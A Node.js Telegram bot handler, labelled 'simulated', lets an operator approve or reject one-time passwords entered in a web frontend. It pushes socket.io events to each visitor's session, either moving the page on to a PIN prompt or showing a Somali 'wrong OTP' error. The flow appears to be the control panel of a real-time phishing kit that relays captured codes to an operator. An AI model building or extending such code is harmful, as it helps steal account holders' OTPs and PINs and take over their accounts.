// Simulated Telegram Bot Manager Implementation
const axios = require('axios');

const TELEGRAM_API = `https://api.telegram.org/bot${process.env.BOT_TOKEN}`;

// Helper utility to escape Markdown characters safely
function escapeMarkdown(text) {
    if (!text) return '';
    return String(text).replace(/([_*\[\]()~`>#+=\|{}.!])/g, '\\$1');
}

/**
 * Handles incoming callback query events routed from your Telegram Webhook router
 */
async function handleCallbackQuery(callbackQuery) {
    const message = callbackQuery.message;
    const categoryData = callbackQuery.data; // Structure layout: "action:ID"
    
    if (!categoryData) return;

    const parts = categoryData.split(':');
    const actionSignal = parts[0];
    const targetAppId = parts[1];

    let auditLogExecutionState = "";

    // FIX ADDED: Action validation execution block for approve_otp signal with complete room validation
    if (actionSignal === 'approve_otp') {

        console.log(`📤 APPROVING OTP FOR ROOM: ${targetAppId}`);

        const rooms = global.io.sockets.adapter.rooms;
        console.log('ROOM FOUND:', rooms.has(targetAppId));

        global.io.to(targetAppId).emit('admin-approve-otp');

        auditLogExecutionState = "✅ OTP status verified. Frontend shifted to secure PIN mode.";
    } 
    else if (actionSignal === 'reject_otp') {
        global.io.to(targetAppId).emit('otp-failed', { message: "Code-ka OTP ee aad gelisay waa khalad" });
        auditLogExecutionState = "❌ OTP verification rejected by administrator panel.";
    }

    // Acknowledge the telegram callback context query immediately to stop loading animations on button
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: auditLogExecutionState ? "Action Processed" : "Unknown Action"
        });

        // Optional: Update the Telegram inline keyboard or text status to display the outcome state
        if (auditLogExecutionState) {
            await axios.post(`${TELEGRAM_API}/editMessageText`, {
                chat_id: message.chat.id,
                message_id: message.message_id,
                text: `${message.text}\n\nStatus: *${escapeMarkdown(auditLogExecutionState)}*`,
                parse_mode: 'MarkdownV2'
            });
        }
    } catch (error) {
        console.error("Error communicating with Telegram API inside callback handler:", error.message);
    }
}

module.exports = {
    handleCallbackQuery,
    escapeMarkdown
};